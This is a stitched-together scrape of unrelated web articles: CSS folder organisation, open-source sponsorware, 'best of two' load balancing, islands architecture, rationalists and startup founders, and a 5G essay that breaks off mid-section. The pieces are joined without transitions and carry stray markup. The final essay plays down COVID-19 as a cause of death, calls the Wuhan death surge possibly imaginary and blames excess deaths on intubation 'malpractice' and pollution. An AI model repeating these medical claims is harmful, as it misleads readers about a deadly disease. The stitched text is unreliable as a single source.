<p>The beating heart of the project. This is where we design the components of the UI. In a few recent projects, I sometimes distinguished between larger modules and smaller components, but you can also nest components into each other and do without the additional distinction. Use prefixes, if you like, and also <a href="https://css-tricks.com/bem-101/">a naming convention like BEM</a> can make a lot of sense. I have recently settled on a BEM-like but more simplified naming convention: Just use the simplest but most descriptive class name possible and separate elements within other elements with a simple dash, like <code>.card</code> and <code>.card-content</code>. Sometimes – for example, when I work with <a href="https://fractal.build/">Fractal</a> – the CSS for individual components might also live in another folder, together with the HTML and JavaScript code. In this case, the components folder might be empty, or contain references via <code>@import</code>.</p>

														
	    	    							    	<pre><code>
├── 7-components
│&nbsp;&nbsp; ├── _accordion.scss
│&nbsp;&nbsp; ├── _card.scss
│&nbsp;&nbsp; ├── _hero.scss
│&nbsp;&nbsp; ├── _pan-galactic-gargle-blaster.scss
│&nbsp;&nbsp; └── ...
</code>
</pre>
											
	    	    				    		      	    	<h3>Utilities</h3>

<p>Another folder? Yes, but this is definitely the last one. The utilities folder contains utility and helper classes and, most importantly, states and modifiers like <code>.is-active</code> or <code>.visually-hidden</code>. Those styles override the styles in the previous layers and are often set via JavaScript. I really like <a href="https://piccalil.li/cube-css/exception/">the suggestion by Andy Bell in his CUBE CSS methodology</a> to use data-attributes to change the state of components, which is also useful in terms of the higher specificity.</p>

														
	    	    							    	<pre><code>
├── 8-utilities
│&nbsp;&nbsp; ├── _modifiers.scss
│&nbsp;&nbsp; └── _states.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>_shame.scss</h3>

<p>This file, which is <a href="https://csswizardry.com/2013/04/shame-css/">another idea by Harry Roberts</a>, is a place for all the shameful CSS solutions like quick fixes and hacky things that might solve a problem for the time being but should be solved properly later. Make sure to document all those nasty hacks with comments, though: Why did you solve it this way? Do you already have an idea on how to solve it better? What is needed to solve it? And so on…</p>

<h3>Putting it all together</h3>

<p>Finally, the <code>main.scss</code> file is where all the individual files are combined. I prefer to explicitly import each file in a new line instead of importing whole folders because I have more control over the source order. But this is only my personal preference, of course.</p>

														
	    	    							    	<pre><code>
@charset "UTF-8";

// 1. Settings
@import 
	"1-settings/global";
  
// 2. Design Tokens
@import
  "2-design-tokens/colors",
  "2-design-tokens/fonts",
  "2-design-tokens/media-queries",
  "2-design-tokens/spacing",
  "2-design-tokens/typography";
...
</code>
</pre>
											
	    	    				    		      	    	<p>And that’s it. A structure like this has served me well in recent projects because it keeps everything tidy. The resulting CSS is also much cleaner and it is easier to find the right piece of code when you have to make changes or do bugfixes.</p>

<p>I asked on Twitter the other day which CSS methodology you all prefer and the results were, as was to be expected, mixed:</p>

														
	    	    							    	<blockquote data-dnt="true"><div lang="en" dir="ltr"><p>Web developers and designers of the interwebs! What is your favorite…</p><p>✨CSS methodology✨?</p><p>—and why?</p></div>— Matthias Ott (@m_ott) <a href="https://twitter.com/m_ott/status/1292946698717757444?ref_src=twsrc%5Etfw">August 10, 2020</a></blockquote>  
											
	    	    				    		      	    	<p>People all like to use their own flavor of CSS, which is great.  If you use a methodology or folder structure that you would like to share, write a post about it and I’ll happily link to it here. It would be interesting to see how you structure your CSS.</p>

<p>For future reference, here’s the whole folder structure again:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I've learnt about Caleb Porzio's <a href="https://calebporzio.com/sponsorware">sponsorware model</a> as a way to fund an open source project. The idea is to release a new feature only to the funders and, once you got X new funders, only then the new feature becomes open source, available to everyone.</p><p>But I haven't seen much success with this strategy yet to fund <a href="https://github.com/GraphQLAPI/graphql-api-for-wp">my open source plugin</a>. The reason is clear: Sponsorware initially worked for Caleb because he asked the 10.000 subscribers on his newsletter for support, from which 75 agreed to be part of it. But I do not have 10.000 subscribers or followers or users, and building such a list takes time.</p><p>Caleb's second strategy seems much more promising: He also started selling access to <a href="https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it">tutorials on using the software</a>. He says this strategy has been incredibly successful: as I'm writing this, <a href="https://github.com/sponsors/calebporzio#sponsors">he's surpassed 1100 sponsors</a>!</p><p>The <strong>quest for learning</strong> appears to be a <strong>strong motivator to fund a project</strong>.</p><p>I've been delaying implementing this strategy, though, because it takes effort to:</p><ol><li>Build the website to check if the user is sponsoring me on GitHub, and only then grant him/her access to the private video in Vimeo</li><li>Create professional videos</li></ol><p>The day has only 24 hs, and I'm working alone on my project, so there's only so much I can do. I've so far decided to prioritize improving the plugin first, adding all the minimal basic features that I would love to have as a user, and only then start producing tutorial videos.</p><p>I've actually been lucky: just a few days ago, site <a href="https://spatie.be/">spatie.be</a> (based on Laravel) was <a href="https://github.com/spatie/spatie.be">open sourced</a>, making available the code implementing several of the required features:</p><ul><li>Validating users through GitHub login</li><li>Giving access to private Vimeo videos to paying users</li></ul><p>So building the site is now within my reach. I just need to work on creating the videos.</p><p>Hopefully I'll soon be able to comment if selling tutorial videos can succeed in funding the open source plugin.</p></div></div>]]>

<p>Using less information to make better decisions.</p>


<p>In many large-scale web services, multiple layers of stateless and stateful services are seperated by load balancers. Load balancing can be done with dedicated hardware, with dedicated software load balancers, using DNS trickery or through a load-balancing mechanism in the client. In large systems, the resources and constraints at each layer can vary widely. Some layers are stateless, and easily scale horizontally to many machines. Other layers may be more constrained, either due to the need to access state or contention for some other shared resource.</p>

<p>Centralized load balancing solutions can distribute load over a fleet of machines very well. They track the amount of load they are sending to each machine (usually based on a simple measurement like connection count). Because they are centralized, load balancers typically don't need to worry about load sent from other sources. They have complete control over the distribution of load.</p>

<p>Despite this advantage, dediced load balancers are often undesirable. They add cost, latency, complexity, and may introduce a single point of failure. Handing the task of load balancing to each upstream client is also possible, but introduces the challenge of fairly balancing the load from multiple places. In large systems with large numbers of clients and fairly homogeneous calls, a purely random system like DNS round robin can work very well. In smaller systems, systems where each downstream service can only handle a small number or concurrent requests, and systems where requests are heterogeneous it's often desirable to load balance better than random.</p>

<p>Perfect distributed load balancing could be done, at least in the happy case, by distributing information about system load across all the clients. The overhead of constantly sharing the exact load information between different sources can be high, so it's tempting to have each source work off a cached copy. This data can periodically be refreshed from downstream, or from other clients.</p>

<p>It turns out that's not a great idea.</p>

<p>In <a href="http://www.eecs.harvard.edu/~michaelm/postscripts/handbook2001.pdf">The Power of Two Random Choices: A Survey of Techniques and Results</a>, Mitzenmacher et. al. survey some research very relevant to this problem. The entire survey is good reading, but one of the most interesting results is about the effects of delayed data (like the cached load results mentioned above) on load balancing. The results are fairly logical in retrospect, but probably don't match most engineers' first expectations.</p>

<p>Using stale data for load balancing leads to a herd behavior, where requests will herd toward a previously quiet host for much longer than it takes to make that host very busy indeed. The next refresh of the cached load data will put the server high up the load list, and it will become quiet again. Then busy again as the next herd sees that it's quiet. Busy. Quiet. Busy. Quiet. And so on.</p>

<p>One possible solution would be to give up on load balancing entirely, and just pick a host at random. Depending on the load factor, that can be a good approach. With many typical loads, though, picking a random host degrades latency and reduces throughput by wasting resources on servers which end up unlucky and quiet.</p>

<p>The approach taken by the studies surveyed by Mitzenmacher is to try two hosts, and pick the one with the least load. This can be done directly (by querying the hosts) but also works surprisingly well on cached load data.</p>

<p>To illustrate how well this works, I ran a simulation of a very simplistic system. Every second one request arrives at a system with 10 servers. Every 8 seconds the oldest request (if any) is removed from the queue on the servers. Load balancing is done with a cached copy of the server queue lengths, updated every N seconds. I considered four approaches: chose a random server, chose the best server, best of two random choices and best of three random choices.</p>

<p><img src="https://s3.amazonaws.com/mbrooker-blog-images/mbrooker_best_of_two_result.png" alt=""></p>

<p>As you can expect, the <em>pick the best</em> approach worked best when perfect undelayed information was available. In the same case, the random pick approach worked poorly, leading to the worst queue times of any of the approaches. As the age of the data increases, the <em>pick the best</em> approach becomes worse and worse because of herding and soon overtakes the random approach as the worst one.</p>

<p><em>Best of 3</em> starts in second place, and puts in a good performance. It gains first place, only to cede it to <em>best of 2</em> as the delay increases. Clearly, the behavior for <em>best of k</em> will approach the behavior of <em>best</em> as k approaches the number of servers. <em>Best of 2</em> remains the strong leader all the way to the end of this simulation. Given these parameters it would start losing to the random approach around a refresh interval of 70. It is the clear leader for intervals over the range from 10 to 70, which is an impressive performance for such a simple approach.</p>

<p><em>Best of 2</em> is good because it combines the best of both worlds: it uses real information about load to pick a host (unlike random), but rejects herd behavior much more strongly than the other two approaches.</p>

<p>Take a look at <a href="http://www.eecs.harvard.edu/~michaelm/postscripts/handbook2001.pdf">The Power of Two Random Choices</a> for a much stronger mathematical argument, and some more surprising places this algorithm works really well.</p>

<p>I’ve struggled to find references to this online, but heard the name used multiple times this year when describing the approach outlined here.</p>

<p>The general idea of an “Islands” architecture is deceptively simple: render HTML pages on the server, and inject placeholders or slots around highly dynamic regions. These placeholders/slots contain the server-rendered HTML output from their corresponding widget. They denote regions that can then be "hydrated" on the client into small self-contained widgets, reusing their server-rendered initial HTML.</p>

<p>You can think of this like a static HTML document that contains multiple separate embedded applications:</p>

<p>  
<img width="600" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-1.png">  
</p>

<p>This may seem similar to "micro-frontends" at first glance. Both approaches share the idea of breaking applications up into independent units, however "micro-frontends" do not typically imply that composition of those units is achieved using HTML.</p>

<p>A closer analog to the "islands" approach would be progressive enhancement, to which we're essentially adding SSR hydration and a consistent metaphor for adding interactivity to a region of the page. In traditional progressive enhancement, we might have a <code>&lt;script&gt;</code> that looks for an image carousel in the page and instantiates a jQuery plugin on it. Instead, that image carousel would be rendered on the server and a dedicated <code>&lt;script&gt;</code> emitted for it that loads the image carousel implementation and in-place upgrades it to be interactive.</p>

<h3 id="whydoesthismatter">Why does this matter?</h3>

<p>As it turns out, there are a number of benefits to the group of approaches described here when compared to typical Single Page Application architectures.</p>

<h5 id="progressivehydrationforfree">"Progressive Hydration" for free</h5>

<p>I’ve touted the performance benefits of <a href="https://www.youtube.com/watch?v=k-A2VfuUROg">Progressive Hydration</a> techniques for frameworks like React, Angular, Preact and Vue. With these architectures, individual widgets on a page are loaded and initialized over time. This can be done using a simple scheduling approach via requestIdleCallback, or can take additional factors into account like viewport visibility, interaction likelihood, product value, etc.</p>

<p>Similar to Progressive Hydration, rendering pages using an islands architecture results in the heavier dynamic portions of the page being initialized not just progressively, but <em>separately</em>. This means individual regions of the page become interactive without anything else on the page needing to be loaded first.</p>

<p>Unlike Progressive Hydration, the approaches that fall out of building around an islands architecture do not require top-down rendering. This is a distinct advantage, since there are no outer “root” components that must be initialized before their descendants. Each part of the page is an isolated unit, and a performance issue in one unit doesn't affect the others.</p>

<h5 id="seoanduxarentatradeoff">SEO and UX aren’t a tradeoff</h5>

<p>The status quo for SSR as used by Single Page Applications is that it’s often cited as a necessity for SEO reasons. However, SSR can actually have a net <em>negative</em> impact on User Experience - visitors are left waiting for the actual functionality of a page to arrive while staring at a frustratingly fake version of that page.</p>

<p>Many applications also suffer from silent SSR performance pitfalls without realizing it. In virtual DOM libraries, it's easy (and common) to accidentally construct a situation where first render destroys the server-rendered HTML DOM, only to recreate it again from scratch (often synchronously). This is the result of some common misconceptions, which may stem from documentation giving an idealized view of hydration while passing over tricky caveats and footguns.</p>

<p>Even in cases where SSR hydration is functioning as designed, the status quo leaves a lot to be desired. The amount of JavaScript work being performed during page load is still many orders of magnitude more than what might be considered "efficient".</p>

</figure>

<p>In an "islands" model, server rendering is not a bolt-on optimization aimed at improving SEO or UX. Instead, it is a fundamental part of how pages are delivered to the browser. The HTML returned in response to navigation contains a meaningful and immediately renderable representation of the content the user requested.</p>

<p>Sections of that HTML may be missing their client-side interactivity, but the document should at least contain the most essential content. For example: a news page’s HTML would contain the article body, and a product page would contain that product’s description.</p>

<p>All of the other content is secondary to this information, and its inclusion in the HTML becomes a product decision. How vital is this bit of information to a user visiting the page? How important is that widget to the business model? A "buy now" button that directly relates to revenue should be easily prioritized over a site feedback survey button that relates to information gathering.</p>

<h5 id="betterforaccessibilityanddiscoverability">Better for accessibility and discoverability</h5>

<p>A website that uses standard HTML links for navigation is easier for assistive technologies and web crawlers to use. This is true regardless of whether links or forms are intercepted by JavaScript and rerouted to client-side logic, because the underlying assumptions remain true: clicking a link navigates to the given page.</p>

<p>Anecdotally, think of the number of times you’ve been sent a “link” to what the sender assumed was the page they were viewing, only to realize the link contained none of the necessary information:</p>

<p>  
<img width="350" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-3.png">  
</p>

<p>Building page-based applications doesn't completely prevent these types of strange experiences, it only makes the decision to do so more direct. It makes the default outcome the accessible one.</p>

<hr>

<p>When it comes down to it, shipping an architecture that requires less code to do something is the type of long-term benefit your future self (or coworkers) will thank you for. It's possible — likely, even — that adopting a model like this requires more up-front design thinking. There are far few batteries-included options available for decomposing apps into independently deliverable widgets. Who knows, maybe we can fix that.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
       <p>In response to <a href="https://applieddivinitystudies.com/2020/09/05/rationality-winning/">Where are all the Successful Rationalists</a>, <a target="_blank" rel="noopener" href="https://forum.effectivealtruism.org/posts/MTqWL53brYhnGiAJN/link-where-are-all-the-successful-rationalists">Robert Wiblin writes</a>:<br><em>The EA community seems to have a lot of very successful people by normal social standards, pursuing earning to give, research, politics and more… Typically they aren’t yet at the top of their fields but that’s unsurprising as most are 25-35.</em></p>
<p>He’s basically right. On the <a target="_blank" rel="noopener" href="https://slatestarcodex.com/2019/01/13/ssc-survey-results-2019/">SSC 2019 survey</a>, the median reader was 30. [1]</p>
<p>So Wiblin’s right, but his comment begs a much more important question: <strong>why do rationalists think being young is incompatible with being at the top of your field?</strong></p>
<p>Take for example, <a target="_blank" rel="noopener" href="https://bioeng.berkeley.edu/faculty/patrick-hsu">Patrick Hsu</a>. He’s 29, an assistant professor at Berkeley, and <a target="_blank" rel="noopener" href="https://scholar.google.com/citations?user=LhnU_joAAAAJ&amp;hl=en&amp;oi=ao">has his name on several seminal CRISPR papers</a>. He <a target="_blank" rel="noopener" href="https://twitter.com/pdhsu/status/1162410158443511808">reads and endorses Alexey Guzey</a> so he’s clearly into weird blogs on the internet. It’s not unreasonable to think that people like this should be part of the rationality community.</p>
<p>Or to take a more visible case, consider all the very young startup founders.</p>
<p><a target="_blank" rel="noopener" href="https://www.briantimar.com/notes/founders/">Brian Timar</a> looked at the companies he’s interested in, and found that the average and median age at founding was 30. If you scan <a target="_blank" rel="noopener" href="https://www.ycombinator.com/topcompanies/">YC’s top 100 companies</a>, many of the founders were under 35 when they started:</p>
<p><img src="https://applieddivinitystudies.com/images/age-at-founding.png"></p><p>92% of founders were under 30 when they started their companies, mean and median age were both 26.</p>
<p>But okay, we might not expect to know about founders who are just getting started. You’re not successful until your company actually succeeds. So how old are those same founders now? Still pretty young.</p>
<p><img src="https://applieddivinitystudies.com/images/current-age.png"></p><p>46% are still under 35, and 85% are under 40. Mean is 36, median is 35.</p>
<p>Data for both charts <a target="_blank" rel="noopener" href="https://docs.google.com/spreadsheets/d/1FeDDGo_SWeDMMZlTrJ_P2TifyJoOqAuOD8klBKQpUdA/edit?usp=sharing">here</a>.</p>
<p>Granting Wiblin’s point about youth, I’ll ask again: where are all the successful rationalists?</p>
<hr>
<p>It gets a lot worse when you consider that ideologically, rationalists should be uniquely well positioned to start a company.</p>
<p><strong>Linear Returns from Wealth</strong><br>For a normal person, the expected financial value of a startup may be high, but the expected returns to personal happiness are very low. A billion dollars will probably only make you a little bit happier than million, so it makes sense to be risk averse and keep your day job. <strong>But for a rationalist utilitarian, returns from wealth are perfectly linear! Every dollar you earn is another dollar you can give to prevent Malaria.</strong> So when it comes to earning, rationalists ought to be risk-neutral, and skew more heavily than normal people towards starting companies.</p>
<p><strong>Willingness to be Weird and Lame</strong><br><a target="_blank" rel="noopener" href="http://paulgraham.com/early.html">Paul Graham says</a> “One of the biggest things holding people back from doing great work is the fear of making something lame.” Meanwhile, rationalists totally disregard this tendency to spend years working on things no one else cares about. Will MacAskill has been <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=MP4WryyGMlE&amp;t=5m10s">speaking for years</a> on the importance of keeping EA weird, but even before that there was a decade of posts about nootropics, longevity and superintelligence, long before it was cool.</p>
<p>Another <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=oJDlzvqrPLk&amp;t=14m10s">panel</a> from back in 2009: “I think we can fairly say that we’re all, Peter maybe less so, not afraid to being weird”</p>
<p><strong>Low Probability High Return Bets</strong><br>Rationalists are also already into doing things with a tiny probability of huge impact, as described in <a target="_blank" rel="noopener" href="https://www.openphilanthropy.org/blog/hits-based-giving">OpenPhil’s Hits-based Giving</a>. This is the entire justification for caring about this like AI Safety. You multiply out the probabilities, and preventing even a 1-in-a-thousand chance of extinction turns out to be a very effective use of time.</p>
<p><strong>Slant Towards Tech</strong><br>Many rationalists are in the UK, but today the epicenter skews more towards the Bay Area. <a href="https://applieddivinitystudies.com/2020/09/05/rationality-winning/">As I wrote last time</a>, 40% work in software engineering, so they should be relatively well poised to start companies.</p>
<p>So seriously, where are all the successful rationalists?</p>
<hr>
<p>Many qualities are ascribed to startup founders. Visionary, optimist, contrarian, workaholic.</p>
<p>What you don’t hear is founders praised for their intellectual honesty.</p>
<p>That shouldn’t come as a surprise. It’s no secret that you need a kind of unreasonable self-confidence to pitch VCs. Less discussed but analogous is the process of recruiting early employees. It is not very compelling to offer: “Come work for me, if we’re incredibly lucky there’s a miniscule chance you’ll get .1% of a billion dollar company which comes out to $500 thousand after dilution, $250 thousand after tax, over 4 years, minus the strike price.”</p>
<p>Alex Danco asks <a target="_blank" rel="noopener" href="https://alexdanco.com/2020/09/17/are-founders-allowed-to-lie/">Are Founders Allowed to Lie</a>. It’s a good piece and you should read it, but the fact that he even has to ask means it’s possible the answer is “yes”, which is just not something any normal industry says about its leaders.</p>
<p>The easiest explanation is that founders really are just consciously manipulative, but I worry we’re underestimating how hard that would be. It takes enormous energy to maintain a lie, and tremendous sociopathy to do so consciously. From what I can tell, a lot of these founders are actually disproportionately philanthropic. I can’t rule out that this is just a PR move or whatever, but this whole idea just feels somewhat extreme and conspiratorial.</p>
<p>So okay, maybe it’s unconscious? Maybe founders are uniquely out of touch with reality and genuinely believe that they’re very likely to beat the overwhelming odds against them?</p>
<p>Again, this doesn’t feel right. Sure, you have to be optimistic, but you can’t be straight up delusional and continue to function at a very high level. Kara Swisher and Elon have a <a target="_blank" rel="noopener" href="https://www.vox.com/2018/11/2/18053424/elon-musk-tesla-spacex-boring-company-self-driving-cars-saudi-twitter-kara-swisher-decode-podcast">great exchange</a> about this, maybe my favorite moment in any interview ever:</p>
<blockquote>
<p><strong>[KS:] What about things that are just critical of you that you don’t like? Do you think you’re particularly sensitive?</strong></p>
<p>[EM:] No. Of course not. Count how many negative articles there are and how many I respond to. One percent, maybe. But the common rebuttal of journalists is, “Oh. My article’s fine. He’s just thin-skinned.” No, your article is false and you don’t want to admit it.</p>
<p><strong>Do you take criticism to heart correctly?</strong></p>
<p>Yes.</p>
<p><strong>Give me an example of something if you could.</strong></p>
<p>How do you think rockets get to orbit?</p>
<p><strong>That’s a fair point.</strong></p>
<p>Not easily. Physics is very demanding. If you get it wrong, the rocket will blow up. Cars are very demanding. If you get it wrong, a car won’t work. Truth in engineering and science is extremely important.</p>
<p><strong>Right. And therefore?</strong></p>
<p>I have a strong interest in the truth.</p>
</blockquote>
<hr>
<p>If founders aren’t liars or delusional, what could explain their seemingly irrational optimism?</p>
<p>Rather than general dishonesty, my theory is that founders neglect one kind of reasoning very specifically. The same kind most rationalists are obsessed with: taking the outside view.</p>
<p>I’m using “outside view” as a kind of general term for meta-level thinking, consulting base rates, or using <a target="_blank" rel="noopener" href="https://slatestarcodex.com/2013/08/06/on-first-looking-into-chapmans-pop-bayesianism/">bayesian epistemology</a>. Basically, it means not trusting your first-order estimates too much, looking around to see whether or not those estimates are justified, and reasoning “from behind the veil”. As <a target="_blank" rel="noopener" href="https://equilibriabook.com/">Inadequate Equilibria</a> describes it:</p>
<blockquote>
<p>Modest epistemology doesn’t need to reflect a skepticism about causal models as such. It can manifest instead as a wariness about putting weight down on one’s own causal models, as opposed to others’….</p>
<p>If we were fully rational (and fully honest), then we would always eventually reach consensus on questions of fact. To become more rational, then, shouldn’t we set aside our claims to special knowledge or insight and modestly profess that, really, we’re all in the same boat? [2]</p>
</blockquote>
<p>Here’s a more concrete example: A rationalist has a good startup idea, so they set out to calculate expected value. YC’s acceptance rate is something like 1%, and even within YC companies, only 1% of them will ever be worth $1 billion. So your odds of actually having an exit of that magnitude are 10,000 to 1, and then you’re diluted down to 10% ownership and taxed at around 50%. Of course, there are exits under and above a billion, but back-of-the-napkin, you’re looking at an expected $5,000 for 10+ years of work so grueling that even successful founders describe it as “<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=yZlHbjxtECg">eating glass and staring at the abyss</a>“. [3]</p>
<p>This is so deeply ingrained in my head as the rational way to think, that it took me a long time to realize that other people just fundamentally don’t approach problems this way. I would venture to guess that the normal train of thought is closer to: “Most startups fail, but that’s because their ideas are bad. Since my idea is very good, I’ll neglect the base rates. I am very special.”</p>
<p>Does that sound mean? It shouldn’t. There’s nothing wrong with thinking that you’re special. It’s not a moral belief, or a claim to entitlement. It’s just the understanding that you are not a median member of the general population, so base rates about “anyone who has ever applied to YC” don’t apply.</p>
<p>The rationalist sees the 1% acceptance rate and gets intimidated. Normal people see that <a target="_blank" rel="noopener" href="https://www.ycombinator.com/faq/#q17">applying to YC</a> <a target="_blank" rel="noopener" href="https://blog.ycombinator.com/common-misconceptions-about-applying-to-yc/">explicitly</a> does not require a business plan, incorporation, existing revenue, or an introduction, and understand that any idiot with a couple hours can will out a web form. Accordingly, they totally ignore the base rate.</p>
<p>That’s all the acceptance part of starting a company, but much more important is actually coming up with an idea you believe in. Rationalists tend to accept the Efficient Markets Hypothesis. They look at an industry, think “what are the odds I know more than people who have done this for a decade?” and assume any seeming inefficiencies are just a <a target="_blank" rel="noopener" href="https://wiki.lesswrong.com/wiki/Chesterton%27s_Fence">Chesterton’s Fence</a>.</p>
<p>That’s not what normal people do at all. Normal people look at an industry, they see a gross inefficiency staring at them in the face, and they think “wow, that’s grossly inefficient!”</p>
<p>And then sometimes, they even set out to solve it.</p>
<hr>
<p>[1] If the median rationalist is now 30, and Yudkowsky started writing in 2007, was his audience mostly teenagers?</p>
<p>[2] I’m not exaggerating. In fact, this is a massive oversimplification of the <a target="_blank" rel="noopener" href="https://www.getguesstimate.com/models/316">estimates of startup success</a> rationalists actually put together.</p>
<p>[3] To be fair, Yudkowsky is specifically attempting to correct against modest epistemology, concluding with an exhortation to not take the outside view so much and instead “spend most of …</p></div></div>

<p>David Crowe<br>Version 3<br>April 24, 2020</p>
<p>
I am a wireless telecom consultant, and have been since 1992. If you want, you can believe that the fact that my income comes from the wireless industry disqualifies me from commenting. Or perhaps, that my expertise is helpful. I have no financial relationship with any company making 5G equipment, although in full disclosure, I was engaged as an expert witness by Huawei around 2011, but that was before much 4G equipment was available, and 5G was still a dream. And an expert witness is ideally not an exponent of the position of a company, and I like to believe I am an ideal expert witness.

</p><h2>5G is Not a Well Defined Concept</h2>
<p>
5G is a set of goals defined by the ITU, not a specific technology. The most obvious goal is that wireless devices should be able to receive data at the fantastic speed of 1Gbps or even higher. This can be achieved by satellites, large towers, or tiny little boxes sitting on the ceiling of an office, or on the wall of a building outside. There are a wide range of frequencies being planned for use although it is true that a lot of 5G systems are planning to use higher frequencies than 4G.

</p><h2>Confusing 5G with GHz and Gbps</h2>
<p>
A lot of critics of 5G seem to be terribly confused by the letter G. Is this the fault of telecom engineers who over-used the letter, or of the critics who couldn’t be bothered to spend an hour researching and writing down the definitions? Let’s straighten that out now:
</p><ul>
<li>The “G” in 5G stands for “Generation”. 1G was analog communications, 2G was early digital with SMS but no data, 3G provided the first data systems, 4G provided a data-only system, with voice treated as just one type of data, and 5G will provide even higher speeds and other advantages.
</li><li>The “G” in GHz stands for one billion (Giga) and references the frequency of the communications. Cellular communications started at 400-900 MHz (Mega = one million) in the 1980s, or just under 1GHz. PCS in the 1990s moved communications up to 2GHz. Some 4G communications are at frequencies as high as 3.5GHz, and 5G is talking about going up to 60GHz. But a lot is still just talk.
</li><li>The “G” in Gbps also stands for one billion, but this is referencing data speed. In the days of modems people talked about kbps (thousands of bits per second). With DSL and ethernet, Mbps (millions of bits per seconds), and now we are in the realm of Gbps (billions of bits per seconds).
</li></ul>

<h2>Explaining What Does Not Need to Be Explained</h2>
<p>
5G in Wuhan is an explanation for a surge of deaths that might be imaginary. I have still seen no evidence that this city of 11 million people actually was experiencing a surge of deaths. First, bring the evidence that there was a dramatic increase, otherwise there is nothing that needs to be explained by 5G or any other theory about the root cause.

</p><h2>Other Explanations for Increased Deaths</h2>
<p>
It has become clear that in Italy and in other parts of Europe, there is an increase in death rates. We know this because the Europeans provide near real-time mortality statistics. But there are other explanations than 5G or the virus, such as:
</p><ul>
<li>Just as with SARS, doctors are aggressively treating people on the basis of the positive test, including intubation, steroids, antiviral drugs, and other unproven medications. We will likely find evidence of serious harm afterwards.
</li><li>Doctors are intubating people because of fear of infection via leaky oxygen masks. This is really malpractice, treating the patient for the benefit of the medical staff, rather than for the benefit of the patient. And the fear was found to be unfounded with SARS.
</li><li>Isolating old, frail people from their family, and even from nurses, who are now hidden behind PPE, is likely to hasten their demise.
</li><li>People are being told to stay away from the ER, or are deciding for themselves, based on fear of the virus. So, when some people do get really sick, they will show up at the hospital in much worse shape, and may even die unnecessarily.
</li><li>Lombardy in Italy, their epicentre, is one of the most polluted parts of Europe. This problem also occurs in Wuhan. Air pollution is not a constant, but gets better and worse as weather conditions change. And an increase in air pollution could explain some deaths.
</li><li>Patients whose deaths were blamed on COVID-19, particularly in Italy, are extremely old (average age 80) and infirm. Of the first 2,003 deaths examined almost half had 3 or more pre-existing health conditions and only 3 deaths were in people with none. China, with a much younger population, also shows above average ages for those diagnosed with illness and, particularly, with deaths. They are the most vulnerable to increases in air pollution and aggressive treatment.
</li><li>Most people who were very sick or died had one or more pre-existing health conditions. Almost half of the first 2,003 deaths in Italy had 3 or more pre-existing health conditions. The average number in the UK was 2.7. In New York, a survey of 5700 hospitalized COVID-19 patients showed that 89% had two or more pre-existing health conditions.
</li></ul>

<h2>What is EMF?</h2>
<p>
Electro-magnetic fields, or electro-magnetic radiation, are vibrations that naturally occur at a wide variety of frequencies. The highest frequency (most rapid vibrations) are Gamma Rays, followed by X Rays, Ultraviolet light, the visible light spectrum from violet down to red, and then the radio or microwave spectrum. Clearly the greatest damage comes from the highest frequencies, and radio and microwave have the lowest frequencies, so on this basis, should have the lowest impact. Even visible light has much higher frequencies than radio waves, and we are bathed in it all the time, although with enough energy, that too can be damaging as any sunburned person can attest (although most of the damage probably comes from the invisible ultraviolet).
</p><p>
Energy of EMF is also found in the amplitude of the wave (how high the wave is as opposed to how far apart the peaks are). It is true that even radio/microwaves can have a lot of energy with high amplitude waves. This means that a microwave oven, operating at high power, would cause massive damage to the human body (which is why it shuts off automatically when the door is opened). By comparison, cellphones operate at a tiny fraction, usually 1/10,000th or 1/100,000th of the energy of a microwave oven.
</p><p>
So, any EMF can be damaging if the amount of energy in the wave is high enough.

</p><h2>Is EMF Radiation?</h2>
<p>
Radiation is usually thought of as the damaging types of radiation coming from nuclear bombs, power plants or nuclear waste. This is more properly called ionizing radiation. Radiation itself just means any energy, whether waves like EMF, or energetic particles, that travels through space. Generally it spreads out with distance, hence the name radiation.
</p><p>
The highest frequency forms of EMF, Gamma Rays and X Rays, are ionizing, and thus can permanently alter atoms by removing electrons. Lower frequency forms, from Ultraviolet down to radio waves, cannot do this.

</p><h2>Can Microwave Emissions Cook Your Brain?</h2>
<p>
Almost the entire range of wireless communications that we are familiar with – cellular, WiFi, 3G, 4G, 5G, PCS, LTE, GSM – falls into the microwave range, which extends from 300 MHz (0.3GHz) to 300 GHz. But to conclude from this that our brains are going to be fried or, rather, microwaved, is an absurdity.
</p><p>
Modern wireless devices usually transmit at less than 1 Watt of power, whereas microwave ovens operate at 600-1200 Watts. Not only that, but wireless communications tries to minimize transmit power. A recent paper found that wireless devices in rural areas generally operated at about 2% of peak power, and in more urban areas at about 1%. In terms of watts, 0.01 to 0.02 watts. Network transmitters (towers) transmit at higher power, but the power level is calculated so that what is received by your phone (and therefore may be absorbed by your body) is at the lowest power level that will provide error free communication.
</p><p>
The main reason for wireless devices to use the lowest possible power may be surprising. Obviously the power bill of the phone companies is reduced if they transmit to devices at the lowest feasible power. And the battery life of your phone, is only as good as it is, because of tight power management. But the real reason is interference. If there are many devices simultaneously transmitting, using the lowest possible power (i.e. the lowest that allows communications without excessive errors that could garble transmissions) then you have less interference between communications, and can get more users on the system, and therefore make more money.
</p><p>
To say that long exposure to power levels that are thousands of times lower than a microwave oven will eventually cook your brain, is like saying that a cook in a restaurant, who can feel the heat (infrared EMF) from an oven while working, will eventually get cooked by that oven. It is an absurdity. This is not to say that there should be no precautions for engineers and technicians who work in high RF emission environments, nor that 5G antennas should be arranged without minimizing human exposure, nor that government regulators should not limit the maximum power of devices that will be close to the human head. There are also concerns with certain high frequencies resonating with functions in the human body. This is also worth investigating.

</p><h2>5G Cannot Explain Patterns of Death</h2>
<p>
5G is currently in the early stages, and there are only relatively small installations. At the higher frequencies the radius of transmission of one cell is quite small, measured in tens or hundreds of meters (yards) rather than in kilometers or miles, as for a standard cellular tower. This means that 5G will cover dense pedestrian areas at first, then move into indoor applications, such as shopping malls. It will be a long time before higher frequencies covers highways, suburban areas and rural areas.

		<h2 id="000000">00:00:00</h2>

